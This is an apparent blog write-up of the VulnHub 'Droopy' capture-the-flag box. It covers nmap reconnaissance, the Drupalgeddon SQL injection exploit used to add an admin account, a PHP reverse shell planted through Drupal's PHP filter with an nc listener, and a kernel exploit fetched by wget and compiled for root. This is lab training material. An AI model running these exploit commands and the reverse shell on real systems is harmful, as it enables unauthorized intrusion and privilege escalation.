---
layout: default
title : muzec - DroopyCTF Writeup
---


![image](https://user-images.githubusercontent.com/69868171/118015078-e576e880-b321-11eb-97a0-c0f3dd003b14.png)

Yet again today we be working on another OSCP like box Droopy On vulnhub you can grab a copy here [Download  Droopy: v0.2](https://www.vulnhub.com/entry/droopy-v02,143/)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```


```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/droppy]
└─$ nmap -sC -sV -oA nmap 172.16.139.175        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-12 10:01 EDT
Nmap scan report for 172.16.139.175
Host is up (0.00013s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds
```

Just a single port cool and a robots.txt directory cool let check the webpage to see what is running .

![image](https://user-images.githubusercontent.com/69868171/118015601-764dc400-b322-11eb-8f77-f74181ccfa00.png)

The CMS is drupal let check the robots.txt .

![image](https://user-images.githubusercontent.com/69868171/118015733-9bdacd80-b322-11eb-9040-ec10628eefdf.png)

So i decided to check the `/CHANGELOG.txt` directory since it always hold drupal version let confirm it .

![image](https://user-images.githubusercontent.com/69868171/118015905-c9277b80-b322-11eb-9204-e0c936329be3.png)

And we have the version let do a quick searchsploit on it .

┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/droppy]
└─$ searchsploit Drupal 7.30
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                    | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                     | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                          | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                          | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                             | php/webapps/35150.php
Drupal < 7.34 - Denial of Service                                                                                                    | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                             | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                          | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                  | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                              | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                     | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                       | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                   | php/webapps/46459.py
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

And boom we some exploit let try the first one since it will be adding a new admin user sound cool right .

`python 34992.py -t http://172.16.139.175/ -u muzec -p muzec`

![image](https://user-images.githubusercontent.com/69868171/118016360-4b17a480-b323-11eb-9fcf-14de63f71ef2.png)

And user created let use it to log in .

![image](https://user-images.githubusercontent.com/69868171/118016447-64b8ec00-b323-11eb-8e48-c498878bcdf7.png)

Ahhhhh we are in awesome right?? lol now let try and get a reverse shell let do some setting first.

![image](https://user-images.githubusercontent.com/69868171/118016554-8c0fb900-b323-11eb-9cff-c5bb59a84068.png)

Click on Modules and scroll down and tick `PHP filter`  and click on save .

![image](https://user-images.githubusercontent.com/69868171/118016747-c4af9280-b323-11eb-90df-2f1a07f18a83.png)

Now let go back to the same Modules and click on permission close to the PHP filter .

![image](https://user-images.githubusercontent.com/69868171/118016959-06403d80-b324-11eb-9458-31c77a595e78.png)

Now let scroll down and tick Use the PHP code text format and save permission.

![image](https://user-images.githubusercontent.com/69868171/118017101-32f45500-b324-11eb-917b-0d3575b8be92.png)

Now let click on Add content .

![image](https://user-images.githubusercontent.com/69868171/118017345-7ea6fe80-b324-11eb-8011-678da7284913.png)

Click on article .

![image](https://user-images.githubusercontent.com/69868171/118017540-bf9f1300-b324-11eb-8744-58ec938f54cb.png)

Now at title let name it shell and skip the tag and move to the body now we need a reverse shell code from pentestmonkey the php one which you can download it here [Download PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) .

Now let copy the reverse shell code to the body and make sure we add our Local-IP address and port also let start an Ncat listener.

![image](https://user-images.githubusercontent.com/69868171/118019411-f70ebf00-b326-11eb-9926-42bd7a6e55de.png)

Now at text format let pick PHP code .

![image](https://user-images.githubusercontent.com/69868171/118019487-0d1c7f80-b327-11eb-823f-7efe24b3fa96.png)

Now let click on save going back to our listener we should have shell.

![image](https://user-images.githubusercontent.com/69868171/118019620-2cb3a800-b327-11eb-86da-140962e45013.png)

And boom we have shell .

![image](https://user-images.githubusercontent.com/69868171/118019741-52d94800-b327-11eb-80c4-d9b0ccc8b154.png)

Now let spawn a TTY shell .

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/droppy]
└─$ nc -nvlp 5555                       
listening on [any] 5555 ...
connect to [172.20.10.4] from (UNKNOWN) [172.20.10.4] 55347
Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
 18:37:44 up 40 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn ("/bin/bash")'
www-data@droopy:/$ 
```
Checking the home directory found a user but nothing interesting about it .

```
www-data@droopy:/home/gsuser$ ls
ls
drupal
www-data@droopy:/home/gsuser$ ls -la
ls -la
total 32
drwxr-xr-x 4 gsuser gsuser 4096 Apr 10  2016 .
drwxr-xr-x 3 root   root   4096 Dec 11  2014 ..
-rw-r--r-- 1 gsuser gsuser  220 Dec 11  2014 .bash_logout
-rw-r--r-- 1 gsuser gsuser 3637 Dec 11  2014 .bashrc
drwx------ 2 gsuser gsuser 4096 Dec 11  2014 .cache
-rw-r--r-- 1 gsuser gsuser  675 Dec 11  2014 .profile
-rw------- 1 root   root   1463 Dec 11  2014 .viminfo
drwxrwxr-x 2 gsuser gsuser 4096 Apr 11  2016 drupal
www-data@droopy:/home/gsuser$ 
```

### Privilege Escalation

Going around found a credentials for MYSQL but nothing intesting in the databases so i decided to check for version .

![image](https://user-images.githubusercontent.com/69868171/118020589-3be72580-b328-11eb-8b81-5761922b0e31.png)

`uname -a`

![image](https://user-images.githubusercontent.com/69868171/118020633-4bff0500-b328-11eb-94ba-67235f26f550.png)

A quick google search and we found our exploit not sure but let give it a try .

![image](https://user-images.githubusercontent.com/69868171/118020771-7d77d080-b328-11eb-8cec-d5988370d9c4.png)

Now let transfer it to the target with SimpleHTTPServer and wget .

![image](https://user-images.githubusercontent.com/69868171/118020922-adbf6f00-b328-11eb-8a72-263abc3b899c.png)

Now let compile the exploit.

`gcc 37292.c -o exploit` now let run it .

![image](https://user-images.githubusercontent.com/69868171/118021447-3a6a2d00-b329-11eb-86ce-667ad099d721.png)

Boom we are root .

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
